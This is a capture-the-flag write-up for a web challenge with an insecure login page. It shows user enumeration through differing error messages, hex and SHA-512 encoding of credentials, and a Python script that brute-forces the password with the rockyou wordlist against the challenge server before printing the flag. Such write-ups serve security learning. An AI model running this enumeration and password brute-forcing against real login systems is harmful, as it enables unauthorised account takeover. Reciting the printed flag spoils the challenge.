# Initial Problem Statement
```
Intern season is up again and our new intern Alex had to do a simple login page. 
Not only the login page is not working properly, it is also highly insecure...
```
# Initial Exploration
### Inspecting the target webserver at: 34.159.78.10:30308
We can see a login page where we can naturally attempt a common user-pass combination like admin:admin.   
After that we are redirected to a blank page but the URI is slightly modified with a weird version of 
our login information:

```
http://34.159.78.10:30308/auth?username=61646d696e&password=c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
```
From the URL we can see that:  
username = admin = 61646d696e  
password = admin = c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec  

The username appears to be hex encoded and hash-identifier suggests that the password is encoded using SHA-512.

#### Inspecting the source code of the login form to see how it works:
```html
<h1>ADMIN PANEL</h1>
<form method="post" action="/login">
    <label for="name">User name</label>
    <input type="text" id="name" name="name">
    <label for="password">Password</label>
    <input type="password" id="password" name="password">
    <button type="submit">Login</button>
</form>
```
The parameter we see in the page source for the first field is called "name" but in the request we made it's called "username"...

# Finding our way to the flag
### Altering the original request

If we try to change the request's "username" parameter into "name" we get an interesting response: **"Invalid user"**
```
http://34.159.78.10:30308/auth?name=61646d696e&password=c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
```
So we must think of an user and since admin doesn't appear to be valid... why not try Alex (hex encoded: 416c6578) after all he designed this page (since he's mentioned in the problem statement, pay attention to the capital 'A').  
The response changed to **"Invalid password"** so we must be on the right track.
```
http://34.159.78.10:30308/auth?name=416c6578&password=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
```

### Cracking the password
For this I created a simple python script to send custom requests with passwords from *rockyou.txt* until we find the right one:
```py
#!/usr/bin/python3
import requests
from pwnlib.util.hashes import sha512sumhex

S = requests.Session()
F = open("/usr/share/wordlists/rockyou.txt", "r")

for p in F:
	sha512 = sha512sumhex(p.strip().encode())
	#print(sha512)
	URL = "http://34.159.78.10:30308/auth?name=416c6578&password=" + sha512
	Response = S.get(URL)
	if(Response.text != "Invalid password"):
		print("Gottem: " + Response.text)
		break
```
After running the script we get some HTML output and also the flag!! 
```html
Gottem: 
<h1>Internal</h1>                                                                                                                                                                  
<hr>                                                                                                                                                                               
<p> Talk about insecure and broken login pages... CTF{bf3dd66e1c8e91683070d17ec2afb13375488eee109a0724bb872c9d70b7cc3d}                                                            
</p>                                                                                                                                                                               
<form method="post" action="/logout">                                                                                                                                              
    <button type="submit">Logout</button>                                                                                                                                          
</form>
``` 
